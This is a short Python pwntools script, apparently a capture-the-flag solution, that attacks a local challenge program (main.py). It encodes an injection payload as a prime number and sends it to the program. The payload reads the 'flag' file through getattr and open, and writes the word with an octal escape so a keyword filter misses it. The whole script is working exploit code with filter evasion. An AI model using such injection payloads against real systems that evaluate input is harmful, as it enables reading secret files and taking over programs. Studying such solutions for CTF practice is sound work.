from Crypto.Util.number import bytes_to_long
from pwn import *
from sympy import nextprime

r = process(["python3.10", "main.py"])

payload = b"c=getattr(open('fl\\141g'),'read')()#" + b"a"*50
payload = bytes_to_long(payload)
payload = nextprime(payload)

p = payload
x = payload-1

r.sendline(str(x))
r.sendline(str(p))

r.interactive()
